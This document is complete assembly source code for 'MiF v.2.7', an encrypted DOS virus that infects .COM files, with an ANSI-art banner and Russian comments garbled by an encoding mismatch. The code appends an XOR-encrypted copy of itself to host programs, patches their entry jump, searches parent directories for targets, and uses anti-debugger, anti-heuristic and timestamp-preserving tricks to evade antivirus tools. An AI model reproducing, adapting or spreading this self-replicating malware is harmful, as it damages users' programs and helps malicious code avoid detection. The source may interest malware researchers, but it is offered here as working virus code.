   ;            ÜÛÜ
   ;           ÜÛÛÛÞ  ÞÛÛÛß  ÜÛÛÛÜÜ  þ Let's add some infection to this þ
   ;          ÜÛÛÛÞÝ   ÛÛÝ ÞÛÛß   ßÝ            fuckin' world
   ;         ÜÛ²² ÛÝ   ÛÛ± ÛÛ²          ÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-ÄÄÄÄ-ÄÄÄ-ÄÄ-Ä--ú ú  ú
   ; ÛÛÛ    ÜÛ²± ÛÛÛÛÛÛ²±± Û²±
   ; ßÛÛÛ  ÜÛ²±  ÞÛÛÝ  Þ²± ÞÛ±          [ MiF ] v.2.7 BugFix (cl) by SST
   ;  ßÛÛÛÜ²±±   ÞÛÛ   ÞÛ²  ÞÛÛÜ  ÜÛÝ
   ;   ßÛÛÛÛ²    ÛÛÛÜ  ÛÛÛÜ  ßÛÛÛÛÛß

   ; *à®áâ¥ìª¨© è¨äà®¢ ë© (with random key) ¥à¥§¥¤¥âë© ¢¨àãá
   ; ¤«ï DOS. ˆä¨æ¨àã¥â *.com (¬¥â®¤ dot-dot), § ¯¨áë¢ ï ¢  ç «®
   ; ¦¥àâ¢ë jmp   á¥¡ï,   á¥¡ï - ¢ ª®¥æ.. ¦¥àâ¢ë ;) ˆá¯®«ì§ã¥â
   ; á«¥¤ãîé¨¥ ¬¥â®¤ë ¬ áª¨à®¢ª¨: ¥ ¬¥ï¥â  âà¨¡ãâ®¢, ¢à¥¬¥¨ ¨
   ; ¤ âë á®§¤ ¨ï (¯®á«¥¤¥© ¬®¤¨ä¨ª æ¨¨) ä ©«®¢, áâ ¢¨â '§ âëçªã'
   ;   int 24h.

   ; ‚¨àãá ¤«ï ®ç¥ì  ç¨ îé¨å (¡¥§ ¢áïª¨å ¯à¨¡ ¬¡ á®¢ ¨ á £®à ¬¨ «¨è¨å ¡ ©â)

   ;  ú------------------- Source Of MiF Virus v.2.7 -------------------ú

   .model tiny                     ; ¤«ï á®§¤ ¨ï ä ©«®¢ com-ä®à¬ â 
   .286                            ; ¨á¯®«ì§ã¥¬ ¨áâàãªæ¨¨ 286 ¯à®æ¥áá®à 
   .code                           ; ãª §ë¢ ¥¬   â®, çâ®  ç «¨áì ¤ ë¥
   org 100h
   start:
           db 090h,0e9h,0h,0h      ; ¤¦ ¬¯ (jmp)    è ¢¨àãá + NOP ¤«ï
                                   ; ¯à®¢¥àª¨   § à ¦¥®áâì
   real_start:
           pusha                   ; ‘®åà ï¥¬ á®¤¥à¦¨¬®¥ à¥£¨áâà®¢
           pushf
           push ss
           push es
           push ds

           xor ax,ax               ; AntiDebuger
           mov es,ax
           mov es:[0004],ax

   antiheur:
           in al,40h               ; ¡¥à¥¬ ¨§ ¯®àâ  â ©¬¥à  á«ãç ©ë© ¡ ©â,
           mov ah,al               ; § ®á¨¬ ¢ ah, ¥é¥ à § ¨ à¥§ã«ìâ â ¢ al
           in al,40h               ; áà ¢¨¢ ¥¬ al ¨ al, ¥á«¨ à ¢®, â®
           cmp ah,al               ; ¨¤¥¬ ¤ «ìè¥, ¥ à ¢®? â®£¤  á®¢   
           jne antiheur            ; ¬¥âªã 'antiheur'. í¬ã«ïâ®àë ¥ ¬®£ãâ ¯®¤®¡à âì
                                   ; ã¦ë¥ ¡ ©âë («¥ì ¨¬ ¢®§¨âìáï!) ¨ £®à¤®
                                   ; ¯¨èãâ 'Ok' ;) (*¥ ¢á¥ av   íâ® ¯®ªã¯ îâáï ;(

           call del_ofs            ; ¯®«ãç¨âì delta offset
   del_ofs:
           mov di,sp
           mov di,[di]
           add sp,2
           sub di,(del_ofs - start) + 100h
           xchg di,bp

           call crypt              ; ¢ë§ë¢ ¥¬ ¯à®æ¥¤ãàã à áè¨äà®¢ª¨
                                   ;  è¥£® ¢¨àï

           jmp next_step           ; ¯¥à¥¯àë£¨¢ ¥¬ ¯à®æ¥¤ãàë áà §ã
                                   ;   à áè¨äà®¢ ë© ª®¤ ¢¨àï
   crypt:
           lea di,[bp+next_step]
           mov cx,(end_vir - next_step + 1) / 2    ; ¤«¨  è¨äàã¥¬®£® ª®¤  ¢¨àãá 
           mov dx,[bp+crypt_key]                   ; ¢ dx ª«îç ¤«ï è¨äà®¢ª¨
   again:
           xor word ptr [di],dx    ; è¨äàã¥¬ ¯®WORD®
           fild number1            ; ç¥à¥§ á®¯à®æ¥áá®à
           fild number2
           fadd
           fistp oki
           add di,[bp+oki]
           loop again
           ret

           number1 dw 1
           number2 dw 1
           oki dw ?

           crypt_key dw 0          ; ª«îç ¤«ï è¨äà®¢ª¨ ¢¨àãá 

   crypt_virus:
           call crypt              ; § è¨äà®¢ «¨

           lea dx,[bp+real_start]  ; § ¯¨á «¨ § è¨äà®¢ ë©
           mov cx,len              ; ªãá®ª ¢ ä ©«
           mov ah,40h
           int 21h
           call crypt              ; à áè¨äà®¢ «¨
           ret

   next_step:
           jmp after_proc          ; ¯¥à¥¯àë£¨¢ ¥¬ ¯à®æ¥¤ãàë

   int24h:
           mov al,3
           iret

   set_lseek:
           mov ah,42h
           xor cx,cx
           cwd                    ; ®¤® ¨ â® ¦¥, çâ® ¨ xor dx,dx,
           int 21h                ; ® â®«ìª® ¥á«¨ ax <= 8000h !
           ret

   after_proc:

           mov ax,3524h           ; ¥¬®¦ª® ¯®¤¯à ¢¨¬ int 24h
           int 21h

           mov ax,2524h
           lea dx,[bp+int24h]
           int 21h

           push cs
           pop  es

           mov ah,47h             ; á®åà ï¥¬ ¯ãâì „Ž‘ 
           xor dl,dl              ; â¥ªãé¨© ¤¨áª
           lea si,[bp+path_buffer]
           int 21h

           mov ah,1ah             ; ãáâ  ¢«¨¢ ¥¬ DTA
           lea dx,[bp+dta]
           int 21h

           lea di,[bp+orig_bytes] ; á®åà ï¥¬ ¯¥à¢ë¥ ç¥âëà¥ ¡ ©â  ¯à®£¨
           mov si,100h

           xchg si,di

           mov cx,4
           rep movsb

   start2:
           mov ah,4eh
           lea dx,[bp+filespec]
           mov cx,7               ; ¢á¥  âà¨¡ãâë

   file:
           int 21h
           jnc infect             ; ä ©«  ©¤¥ - ¨ä¨æ¨àã¥¬ ¥£®
           jmp prev               ; ¥â? ¨é¥¬ ¢ ¯à¥¤ë¤ãé¥¬ ª â «®£¥

   prev:
           mov ah,3bh             ; ¯¥à¥©â¨ ¢ ¯à¥¤ë¤ãé¨© ª â «®£
           lea dx,[bp+pdir]
           int 21h
           jnc start2
           jmp exit

   infect:
           mov ax,4300h
           lea dx,[bp+dta+1eh]
           int 21h

           mov [bp+attribs],cx     ; á®åà ¨âì  âà¨¡ãâë

           xor cx,cx               ; ã¡à âì ¢á¥  âà¨¡ãâë

           mov ax,4301h
           lea dx,[bp+dta+1eh]
           int 21h

   ; *®à®© á ¬ ã¤¨¢«ï¥èìáï, ª ª ¦¥ «¥£ª® ®¡¬ ãâì  â¨¢¨àãáë ;)
   ; *¥§ ¢áïª¨å  ¢®à®ç¥ëå ¯à¨¥¬®¢, ¯à®áâ® ®ç¨é ¥¬ à¥£¨áâà ax,
   ; § ®á¨¬ ¢ ah=3dh (äãªæ¨ï ®âªàëâ¨ï ä ©«  ¤«ï —’…*ˆŸ ¨ â®«ìª®),
   ;   ¯®â®¬ ¯®¤¡¨à ¥¬ ¨§ ¯®àâ  â ©¬¥à  (ª ª ® ¯®«¥§¥!) 02h ¢
   ; à¥£¨áâà al. ‚ ax ¯®«ãç ¥¬ 3d02h, ® ¢¨¤® âàã¤® ¯®¤®¡à âì
   ; à¥§¨¤¥âë¬  â¨¢¨àãáë¬ ¬®¨â®à ¬ ¨ ¯à®ç¥© ¥ç¥áâ¨ ;) â ª
   ; ¥®¡å®¤¨¬®¥ 02h ¢ al ¨ 'çã¤®-¯à®£à ¬ª¨' ¨ª ª ¥ à¥ £¨àãîâ
   ;   § ¯ãáª ¢¨àï, ¢¥¤ì ¯® ¨å '¬¥¨î' ¬ë ¯à®áâ® ®âªàë¢ ¥¬ ä ©«
   ; ¤«ï —’…*ˆŸ, ¥ ¡®«¥¥ => 8-)  (¥ à ¡®â ¥â   NOD32 :(

           xor ax,ax               ; ®ç¨áâ¨âì à¥£¨áâà ax

           mov ah,3dh              ; ®âªàëâì ä ©« ¤«ï çâ¥¨ï (¨ ¢á¥!)

   obman:
           in al,40h               ; ¯®¤¡®àª  02h ¤«ï à¥£¨áâà  al ¨§
           cmp al,02h              ; ¯®àâ  â ©¬¥à 
           jne obman


           lea dx,[bp+dta+1eh]     ; ¢ dx - ¨¬ï  ©¤¥®£® ä ©« 
                                   ; ¡¥à¥âáï ¨§ DTA
           int 21h

           jnc all_ok              ; ¥â ®è¨¡®ª? â®£¤    'all_ok'

           jmp find_next           ; ®è¨¡ª¨? ¨é¥¬ á«¥¤ãîé¨©

   ; *ã   ¤ «ìè¥ ¢á¥ ª ª ¯® ¬ á«ã :))

   all_ok:

           xchg bx,ax              ; åí¤«  ©¤¥®£® ä ©« 

           mov ah,3fh              ; ¯à®ç¨â âì ¯¥à¢ë¥ âà¨ ¡ ©â 
           mov cx,4
           lea dx,[bp+orig_bytes]
           int 21h

           jc close                ; ¥áâì ®è¨¡ª¨? â®£¤  - á«¥¤ãîé¥©


           cmp word ptr [bp+orig_bytes],0E990h
   ;//  ’®«ìª®   NOP ¥ à¥ª®¬¥¤ãî ¯à®¢¥àïâì - â ª®¥ â®¦¥ ¢áâà¥ç ¥âáï..

           je close

           cmp [bp+orig_bytes],'M' ; íâ® EXE (MZ) ¯¥à¥¨¬¥®¢ ë© ¢ com?
           je close                ; ¤ ? -   close
           cmp [bp+orig_bytes],'Z' ; EXE (ZM)?
           je close                ; ¤ ? -   close

           mov al,02h
           call set_lseek

           jc close

           or dx,dx
           jnz close

           cmp ax,end_vir - start  ; ä ©« à ¢¥ à §¬¥àã ¢¨àï?
           jna close               ; ¤ ? -   close

           cmp ax,65000d           ; ä ©« => 65000 ¡ ©â?
           jnb close               ; ¤ ? -   close

           in al,40h               ; ®¯ïâì ¦¥ ¨§ ¯®àâ  â ©¬¥à 
           mov ah,al               ; ¡¥à¥¬ á«ãç ©ë¥ ç¨á«  ;)
           in al,40h
           mov [bp+crypt_key],ax   ; á®åà ï¥¬ ª«îç (ax) ¢ 'crypt_key'

           mov ax,5700h            ; á®åà ï¥¬ ¢à¥¬ï ¨ ¤ âã ¯®á«¥¤¥©
           int 21h                 ; ¬®¤¨ä¨ª æ¨¨ ä ©« 
           mov [bp+time],cx
           mov [bp+date],dx


           mov al,02h
           call set_lseek          ; ¢ ª®¥æ ¢¨àãá 

           jc close

           mov cx,word ptr [bp+dta+1ah]       ; à §¬¥à ä ©« 

           sub cx,3                           ; ¬¨ãá âà¨ ¡ ©â  (¤«ï jmp' )
           mov word ptr [bp+first_bytes+2],cx

           call crypt_virus        ; § ¯¨è¥¬ ¢ ª®¥æ ä ©« 
                                   ; § è¨äà®¢ ë© ¢¨àì

           jc close                ; ¥áâì ®è¨¡ª¨? â®£¤  - á«¥¤ãîé¨©

           xor al,al               ; al=00h
           call set_lseek          ; ¢  ç «® ä ©« 

           jc close

           mov ah,40h              ; ¯¨è¥¬ jmp   ¢¨àì ¢  ç «® ä ©« 
           lea dx,[bp+first_bytes]
           mov cx,4
           int 21h

           jc close                ; ¥áâì ®è¨¡ª¨? â®£¤  - á«¥¤ãîé¨©


           mov ax,5701h
           mov cx,[bp+time]
           mov dx,[bp+date]
           int 21h

   close:
           mov ah,3eh              ; § ªàëâì ä ©«
           int 21h


   find_next:

           mov cx,[bp+attribs]
           lea dx,[bp+dta+1eh]
           mov ax,4301h
           int 21h

           mov ah,4fh              ; ¨é¥¬ á«¥¤ãîéãî ¦¥àâ¢ã
           jmp file

   exit:
           mov ah,1ah              ; DTA, 80h (áâ ¤ àâ®)
           mov dx,80h
           int 21h

   ; ¢®ááâ ®¢¨âì ®à¨£¨ «ìë© int 24h

           mov ax,2524h
           int 21h

           pop ds
           pop es

   ; int 24h ¢®ááâ ®¢«¥


           mov ah,3bh              ; ¢®ááâ ®¢¨âì ¯ãâì „Ž‘ 
           lea dx,[bp+path_buffer]
           int 21h

           pop ax
           mov es:[0004],ax

           push 100h               ; ¯¥à¥¤ âì ã¯à ¢«¥¨¥ § à ¦¥®©
           pop di                  ; ¯à®£à ¬¬¥ (ª®á¢¥ë© jmp   100h)
           jmp di

           pop ds
           pop es
           pop ss
           popf
           popa

           ret

   ; ¤ ë¥, ã¦ë¥ ¢¨àãáã

   pdir db '..',0
   filespec db '*.com',0
   first_bytes db 90h,0E9h,0h,0h
   orig_bytes db 0cdh,20h,90h,90h
   virname db '[ MiF ]',0

   len equ $ - real_start

   end_vir:

   ; ¬ãá®à

   path_buffer db 64 dup (?)
   dta db 42 dup (?)
   attribs dw ?
   time dw ?
   date dw ?

   end start

   ;  ú------------------- Source Of MiF Virus v.2.7 -------------------ú
